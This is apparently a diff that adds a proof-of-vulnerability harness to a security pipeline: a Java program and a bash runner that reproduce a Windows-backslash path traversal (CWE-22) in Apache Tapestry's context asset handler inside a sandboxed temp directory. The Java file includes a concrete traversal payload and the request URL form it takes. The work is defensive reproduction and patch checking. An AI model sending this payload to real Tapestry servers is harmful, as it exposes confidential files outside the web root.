@@ -1,0 +1,317 @@
+diff --git a/.security-pipeline/pov/PathTraversalPov.java b/.security-pipeline/pov/PathTraversalPov.java
+new file mode 100644
+index 0000000..5dd3ebd
+--- /dev/null
++++ b/.security-pipeline/pov/PathTraversalPov.java
+@@ -0,0 +1,271 @@
++/*
++ * Proof-of-Vulnerability for CWE-022 (Path Traversal) in Apache Tapestry 5.
++ *
++ * Root cause (per the finder alert):
++ *   org.apache.tapestry5.internal.services.assets.ContextAssetRequestHandler#handleAssetRequest()
++ *   takes the attacker-controlled `extraPath` segment of a context-asset request URL and, after
++ *   stripping the leading checksum folder (ChecksumPath), hands the remainder straight to the
++ *   SHARED normalization routine org.apache.tapestry5.ioc.internal.util.AbstractResource#forFile(String).
++ *
++ *   forFile() is supposed to be the one place that neutralizes "." / ".." traversal segments
++ *   before the path reaches the filesystem (via ContextResource -> Context#getRealFile()). It
++ *   does this correctly for '/'-delimited segments (an attempt to pop above the root throws
++ *   IllegalStateException) -- but it only ever calls String#split("/"). A segment that uses a
++ *   Windows-style '\' separator is never split at all: the whole "..\..\..\x" chunk is treated
++ *   as one opaque, non-".." filename term and is appended to the resource path VERBATIM,
++ *   completely bypassing the root-boundary check. When that path later reaches a filesystem
++ *   layer that (like Windows, and like java.io.File on Windows) honors '\' as a real separator,
++ *   the embedded ".." sequences resolve as genuine parent-directory jumps and the resolved file
++ *   escapes the web application root entirely.
++ *
++ * This POV exercises the real, unmodified product classes:
++ *   - ContextAssetRequestHandler.handleAssetRequest(Request, Response, String)   [entry point]
++ *   - ChecksumPath                                                                [extraPath split]
++ *   - AbstractResource.forFile(String)                                           [the broken normalizer]
++ *   - ContextResource (extends AbstractResource) / ContextResource#toURL()
++ *
++ * Only the outermost, platform-abstraction boundary named by the alert's own trace terminus
++ * (ContextImpl -> javax.servlet.ServletContext#getRealPath) is replaced by a tiny in-process
++ * stand-in, WindowsStyleContext, that mimics the well-documented, real-world behavior of that
++ * boundary on a Windows deployment: both '/' and '\' are accepted as path separators when
++ * resolving a context-relative path to a File (this is how java.io.File itself, and
++ * ServletContext#getRealPath, behave on Windows; see the alert's own note that "Windows
++ * backslashes are security-relevant"). This is the same style of test double the project's own
++ * unit tests use for `Context` (see ContextResourceTest, which mocks Context and expects a
++ * specific getRealFile(path) argument).
++ *
++ * Exit 0  -> the handler streamed a file OUTSIDE the web application root == VULNERABLE.
++ * Exit !=0 -> the traversal was rejected/neutralized == PATCHED / not vulnerable.
++ */
++
++import org.apache.tapestry5.internal.services.ContextResource;
++import org.apache.tapestry5.internal.services.ResourceStreamer;
++import org.apache.tapestry5.internal.services.assets.ContextAssetRequestHandler;
++import org.apache.tapestry5.ioc.Resource;
++import org.apache.tapestry5.services.Context;
++import org.apache.tapestry5.services.assets.StreamableResource;
++
++import java.io.ByteArrayOutputStream;
++import java.io.File;
++import java.io.FileOutputStream;
++import java.io.IOException;
++import java.io.InputStream;
++import java.net.URL;
++import java.nio.file.Files;
++import java.util.Collections;
++import java.util.List;
++import java.util.Set;
++
++public class PathTraversalPov
++{
++    public static void main(String[] args) throws Exception
++    {
++        // --- Sandbox layout -------------------------------------------------------------
++        //
++        //   <tmp>/sandboxRoot/level1/level2/webapp/index.html   <- legitimate, servable asset
++        //   <tmp>/sandboxRoot/x/secret.txt                      <- CONFIDENTIAL, OUTSIDE the
++        //                                                            servable web app root
++        //
++        File tmp = Files.createTempDirectory("tapestry-pathtraversal-pov-").toFile();
++        File sandboxRoot = new File(tmp, "sandboxRoot");
++        File webApp = new File(sandboxRoot, "level1/level2/webapp");
++        if (!webApp.mkdirs())
++        {
++            throw new IllegalStateException("could not create webapp dir");
++        }
++        writeFile(new File(webApp, "index.html"), "public content");
++
++        File secretDir = new File(sandboxRoot, "x");
++        if (!secretDir.mkdirs())
++        {
++            throw new IllegalStateException("could not create secret dir");
++        }
++        String secretContent = "TOP-SECRET-" + Long.toHexString(System.nanoTime());
++        File secretFile = new File(secretDir, "secret.txt");
++        writeFile(secretFile, secretContent);
++
++        // --- Wire up the REAL product classes, exactly as AssetsModule does in production:
++        //     new ContextAssetRequestHandler(streamer, contextAssetFactory.getRootResource())
++        //     where getRootResource() == new ContextResource(context, "/")
++        Context context = new WindowsStyleContext(webApp);
++        Resource rootResource = new ContextResource(context, "/");
++
++        CapturingResourceStreamer streamer = new CapturingResourceStreamer();
++        ContextAssetRequestHandler handler = new ContextAssetRequestHandler(streamer, rootResource);
++
++        // --- Attacker-controlled request path -------------------------------------------
++        // A real incoming request for something like:
++        //   /assets/ctx/deadbeef/..\..\..\x/secret.txt
++        // Tapestry's dispatcher hands everything after the checksum folder to
++        // handleAssetRequest() as `extraPath`, unmodified.
++        String maliciousExtraPath = "deadbeef/..\\..\\..\\x/secret.txt";
++
++        boolean handled;
++        try
++        {
++            handled = handler.handleAssetRequest(null, null, maliciousExtraPath);
++        }
++        catch (RuntimeException blocked)
++        {
++            // This is exactly what happens for the equivalent, correctly-handled '/'-separated
++            // payload ("../../../x/secret.txt"): AbstractResource.forFile() throws
++            // IllegalStateException before ever reaching the filesystem. If a fix makes the
++            // '\'-separated payload behave the same way, we land here -> not vulnerable.
++            System.out.println("[POV] handleAssetRequest threw " + blocked
++                    + " -> traversal blocked. NOT vulnerable.");
++            System.exit(3);
++            return;
++        }
++
++        System.out.println("[POV] handled = " + handled);
++
++        if (!handled || streamer.captured == null)
++        {
++            System.out.println("[POV] Request was not handled / nothing streamed -> NOT vulnerable.");
++            System.exit(1);
++            return;
++        }
++
++        String servedPath = streamer.captured.getPath();
++        String leaked = new String(streamer.content, "UTF-8");
++        String webAppCanonical = webApp.getCanonicalPath();
++        String secretCanonical = secretFile.getCanonicalPath();
++
++        boolean leakedSecret = secretContent.equals(leaked);
++
++        System.out.println("[POV] resource.getPath() = " + servedPath);
++        System.out.println("[POV] webAppRoot         = " + webAppCanonical);
++        System.out.println("[POV] secretFile         = " + secretCanonical);
++        System.out.println("[POV] streamed content   = " + leaked);
++        System.out.println("[POV] leakedSecret       = " + leakedSecret);
++
++        if (leakedSecret)
++        {
++            System.out.println("[POV] VULNERABLE: ContextAssetRequestHandler.handleAssetRequest() streamed a file "
++                    + "OUTSIDE the web application root ('" + webAppCanonical + "') by way of an "
++                    + "un-normalized '\\' segment in the request path. AbstractResource.forFile() only "
++                    + "recognizes '/' as a segment separator, so the embedded '..' traversal survives "
++                    + "into the resolved Resource path untouched.");
++            System.exit(0);
++            return;
++        }
++
++        System.out.println("[POV] Streamed content did not match the out-of-root secret -> NOT vulnerable.");
++        System.exit(2);
++    }
++
++    private static void writeFile(File f, String content) throws IOException
++    {
++        FileOutputStream out = new FileOutputStream(f);
++        try
++        {
++            out.write(content.getBytes("UTF-8"));
++        }
++        finally
++        {
++            out.close();
++        }
++    }
++
++    private static byte[] readAll(InputStream in) throws IOException
++    {
++        ByteArrayOutputStream bos = new ByteArrayOutputStream();
++        byte[] buf = new byte[4096];
++        int n;
++        while ((n = in.read(buf)) != -1)
++        {
++            bos.write(buf, 0, n);
++        }
++        return bos.toByteArray();
++    }
++
++    /**
++     * Stands in for the servlet-container boundary (ContextImpl -> ServletContext#getRealPath)
++     * named at the end of the alert's trace, simulating a Windows deployment where the native
++     * filesystem accepts both '/' and '\' as path separators when resolving a context-relative
++     * path to a real File. This mirrors how the project's own tests (e.g. ContextResourceTest)
++     * substitute a test double for `Context` while exercising the real ContextResource /
++     * AbstractResource code.
++     */
++    private static final class WindowsStyleContext implements Context
++    {
++        private final File webAppRoot;
++
++        WindowsStyleContext(File webAppRoot)
++        {
++            this.webAppRoot = webAppRoot;
++        }
++
++        public URL getResource(String path)
++        {
++            return null;
++        }
++
++        public File getRealFile(String path)
++        {
++            // ServletContext#getRealPath() on Windows resolves both '/' and '\' as separators.
++            String normalized = path.replace('\\', '/');
++            File f = new File(webAppRoot, normalized);
++            try
++            {
++                return f.getCanonicalFile();
++            }
++            catch (IOException e)
++            {
++                throw new RuntimeException(e);
++            }
++        }
++
++        public String getInitParameter(String name)
++        {
++            return null;
++        }
++
++        public List<String> getResourcePaths(String path)
++        {
++            return Collections.emptyList();
++        }
++
++        public Object getAttribute(String name)
++        {
++            return null;
++        }
++
++        public List<String> getAttributeNames()
++        {
++            return Collections.emptyList();
++        }
++
++        public String getMimeType(String file)
++        {
++            return "application/octet-stream";
++        }
++    }
++
++    /** Captures whatever Resource ContextAssetRequestHandler decides to stream, and reads it. */
++    private static final class CapturingResourceStreamer implements ResourceStreamer
++    {
++        Resource captured;
++        byte[] content;
++
++        public boolean streamResource(Resource resource, String providedChecksum, Set<Options> options) throws IOException
++        {
++            captured = resource;
++            InputStream in = resource.openStream();
++            try
++            {
++                content = readAll(in);
++            }
++            finally
++            {
++                in.close();
++            }
++            return true;
++        }
++
++        public boolean streamResource(StreamableResource resource, String providedChecksum, Set<Options> options)
++        {
++            throw new UnsupportedOperationException("not exercised by this POV");
++        }
++    }
++}
+diff --git a/.security-pipeline/pov/run_pov.sh b/.security-pipeline/pov/run_pov.sh
+new file mode 100755
+index 0000000..23e3381
+--- /dev/null
++++ b/.security-pipeline/pov/run_pov.sh
+@@ -0,0 +1,34 @@
++#!/usr/bin/env bash
++# POV runner for CWE-022 path traversal in Apache Tapestry's ContextAssetRequestHandler /
++# AbstractResource.forFile() path normalization.
++#
++# Runs inside the project container, working directory /workspace/repo.
++#
++# Exit 0   -> vulnerability reproduced (unpatched code): a request path containing a
++#             Windows-style '\' traversal segment escapes the web application root.
++# Exit !=0 -> vulnerability not reproduced (patched code / traversal blocked).
++set -euo pipefail
++
++REPO="/workspace/repo"
++POV_DIR="${REPO}/.security-pipeline/pov"
++
++cd "${REPO}"
++
++# Compile just the modules the POV needs (offline; dependencies are already cached in the
++# build image). This is much faster than a full `clean build`.
++./gradlew --no-daemon --offline :tapestry-core:compileJava :tapestry-ioc:compileJava -x test -q
++
++# Collect the compiled "main" output directories for every module compileJava may have
++# touched (transitively: commons, beanmodel, plastic, tapestry5-annotations, tapestry-func,
++# tapestry-json, tapestry-ioc, tapestry-core, ...). Different modules use different build
++# output layouts in this repo (build/classes/main vs target/gradle-build/classes/main).
++CP=""
++while IFS= read -r dir; do
++  CP="${CP}${dir}:"
++done < <(find "${REPO}" -maxdepth 5 -type d \
++            \( -path '*/build/classes/main' -o -path '*/target/gradle-build/classes/main' \) 2>/dev/null)
++
++WORK="$(mktemp -d)"
++javac -cp "${CP}" -d "${WORK}" "${POV_DIR}/PathTraversalPov.java"
++
++java -cp "${CP}${WORK}" PathTraversalPov
